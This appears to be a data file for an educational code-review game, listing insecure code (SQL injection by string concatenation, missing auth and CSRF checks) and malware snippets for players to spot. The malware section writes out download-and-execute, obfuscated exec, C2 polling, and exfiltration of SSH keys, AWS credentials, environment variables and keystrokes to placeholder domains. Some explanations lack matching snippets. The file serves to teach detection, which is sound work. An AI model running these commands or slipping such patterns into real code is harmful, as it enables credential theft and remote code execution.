meta.name: Code Invaders Trend Pack
notes: Examples use placeholder domains like payload.invalid, c2.invalid, and exfil.invalid.
These are intentionally obvious for educational gameplay rather than fully realistic production code.
Focus areas were chosen from recent OWASP, MITRE CWE, CISA, and MITRE ATT&CK guidance.

insecure.snippet: const sql = "SELECT * FROM users WHERE id=" + req.query.id
insecure.look_for: string-built query; user input inside SQL

insecure.snippet: await db.query(`SELECT * FROM orders WHERE email = '${email}'`)
query = "SELECT * FROM users WHERE name = '" + username + "'"
String q = "SELECT * FROM files WHERE path='" + path + "'";
db.Query("SELECT * FROM users WHERE role = '" + role + "'")
const q = "UPDATE inventory SET qty=" + qty + " WHERE sku='" + sku + "'";
sql = "SELECT * FROM logs ORDER BY " + request.args["sort"]

insecure.why_it_matters: Deletes arbitrary paths or chains commands.
Turns safe API into unsafe shell.
Depends on template escaping; risky if unescaped.
Can produce unsafe HTML or other issues.

insecure.why_it_matters: Image fetchers are classic SSRF paths.
Still SSRF, plus shell risk if stringified.

insecure.look_for: object lookup by user-supplied id; no auth check
token valid but resource auth missing

insecure.why_it_matters: Lets players see suspicious full-object writes.
Looks like JWT but lacks signature.

insecure.look_for: basic auth built from raw creds

insecure.snippet: ast.literal_eval(request.args["obj"]) # replaced later with eval during debug
insecure.why_it_matters: Players should learn this drift pattern.

insecure.why_it_matters: Cross-origin data exposure if sensitive endpoints rely on cookies/tokens improperly.

insecure.look_for: state-changing endpoint with no CSRF guard
POST state change shown without CSRF token

insecure.why_it_matters: Leaky stack traces / unsafe prod config.

malware.why_it_matters: Downloads and runs in one step.

malware.snippet:
python3 - <<'PY'
import urllib.request,os
p="/tmp/x.py"
open(p,"wb").write(urllib.request.urlopen("https://payload.invalid/x.py").read())
os.system(f"python3 {p}")
PY
malware.look_for: writes remote code then runs it

malware.snippet: code="".join(chr(c^7) for c in data); exec(code)

malware.look_for: infinite polling to remote task URL

malware.snippet: while true; do curl -fsS https://c2.invalid/ok >/dev/null; sleep 60; done
for p in Path.home().rglob("*.pem"): requests.post("https://exfil.invalid/f", files={"f":open(p,"rb")})
Get-ChildItem Env: | ConvertTo-Json | % { iwr https://exfil.invalid/e -Method POST -Body $_ }
for f in ~/.aws/*; do curl -X POST https://exfil.invalid/u --data-binary @"$f"; done
for l in pynput.keyboard.Listener(on_press=lambda k: requests.post("https://exfil.invalid/k",data=str(k))): pass
for (const f of files) fs.renameSync(f, f+".encrypted")
